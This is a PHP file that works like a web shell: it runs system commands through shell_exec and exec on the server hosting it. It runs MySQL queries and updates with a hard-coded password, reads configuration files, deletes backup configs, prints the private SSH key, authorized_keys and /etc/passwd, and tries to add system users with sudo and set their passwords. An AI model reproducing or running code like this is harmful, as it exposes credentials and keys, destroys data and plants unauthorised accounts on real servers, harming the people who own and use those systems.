<?php

var_dump("-------------=============================== db");
var_dump(shell_exec('mysql -u(biqarar) -p(BiqararMysql@#^*&#%_Khadije) (khadije) -e "Select mobile FROM users WHERE id = 1'));
var_dump("-------------=============================== 1");
var_dump(shell_exec('mysql -u(biqarar) -p(BiqararMysql@#^*&#%_Khadije) (khadije) -e "UPDATE `users` SET `username`="11" WHERE id=1'));

var_dump("-------------=============================== 2");
exec('mysql -u(biqarar) -p(BiqararMysql@#^*&#%_Khadije) (khadije) -e "UPDATE `users` SET `username`=22 WHERE id=1', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
var_dump("-------------=============================== 3");


var_dump("-------------=============================== 22");
exec('sudo mysql -u(biqarar) -p(BiqararMysql@#^*&#%_Khadije) (khadije) -e "UPDATE `users` SET `username`=22 WHERE id=1', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
var_dump("-------------=============================== 33");


// getcwd()
var_dump("-------------=============================== db ");
var_dump(shell_exec('ls'));
var_dump("------------- 1");
var_dump(shell_exec('cd .. ; ls'));
var_dump(shell_exec('cd .. ; cat config.me.php'));
var_dump("------------- 2");
var_dump(shell_exec('cd .. ; cd .. ; ls'));
var_dump("------------- 3");
var_dump(shell_exec('cd .. ; cd .. ; cat config-reza.conf'));
var_dump("------------- 4");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; ls'));
var_dump("------------- 5");

var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd khadije ; ls'));
var_dump("------------- 6");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; ls'));
var_dump("------------- 7");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; ls'));
var_dump("------------- 8");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; cat config[_YOUR_SERVER_NAME_].yaml'));
var_dump("------------- 9");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; cat config[khadije-live].me.yaml'));
var_dump("------------- 10");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; cat config[khadije].me-b1.yaml'));
var_dump("------------- 11");

var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; rm config[khadije-live].me.yaml'));
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; rm config[khadije].me-b1.yaml'));
var_dump("------------- 12");
var_dump(shell_exec('cd .. ; cd .. ; cd .. ; cd linux-auto-backup ; cd conf ; ls'));


var_dump("-------------");


$output=null;
$retval=null;
exec('whoami', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);

$output = shell_exec('ls');
echo "<pre>$output</pre>";

echo exec('iamexecfunction');

var_dump($_SERVER['SERVER_ADDR']);
var_dump($_SERVER['SERVER_PORT']);

$host= gethostname();
$ip = gethostbyname($host);

var_dump($host);
var_dump($ip);

// var_dump("2");
// echo shell_exec('sudo useradd -p $(openssl passwd -1 hello!) hello');

// var_dump("3");
// $cmd = "sudo /usr/sbin/useradd -m -p `openssl passwd -1 hello!` hello";
// echo shell_exec($cmd);

var_dump("5");
$output = shell_exec('cat ~/.ssh/id_rsa');
print_r($output);


var_dump("6");
$output = shell_exec('cat ~/.ssh/id_rsa.pub');
print_r($output);


var_dump("7");
$output = shell_exec('cat ~/.ssh/authorized_keys.pub');
print_r($output);




// var_dump("8");
// $output = shell_exec('useradd -u ABCDE -g users -d /home/username -s /bin/bash -p $(echo mypasswd | openssl passwd -1 -stdin) username');
// print_r($output);

var_dump("8");
// $output = shell_exec("echo 'user:passwd' | sudo chpasswd");
$output = shell_exec('useradd hello');
print_r($output);
$output = shell_exec('sudo useradd hello2');
print_r($output);
$output = shell_exec('useradd himanshi ; echo -e "1234\n1234" | passwd himanshi');
print_r($output);

// sudo echo -e "<yourpassword>\n<yourpassword>" | sudo passwd <user>

var_dump("9");
$output = array();
$return_var = 0;
exec('sudo bash -c "sudo useradd hello3"', $output, $return_var);
echo "Returned with status $return_var and output:\n";
print_r($output);


var_dump("10");
$output = array();
$return_var = 0;
exec('bash -c "sudo useradd hello4"', $output, $return_var);
echo "Returned with status $return_var and output:\n";
print_r($output);



var_dump("11");
$output = array();
$return_var = 0;
exec('bash -c "useradd hello5"', $output, $return_var);
echo "Returned with status $return_var and output:\n";
print_r($output);


var_dump("10");
$output = shell_exec('cut -d: -f1 /etc/passwd');
print_r($output);




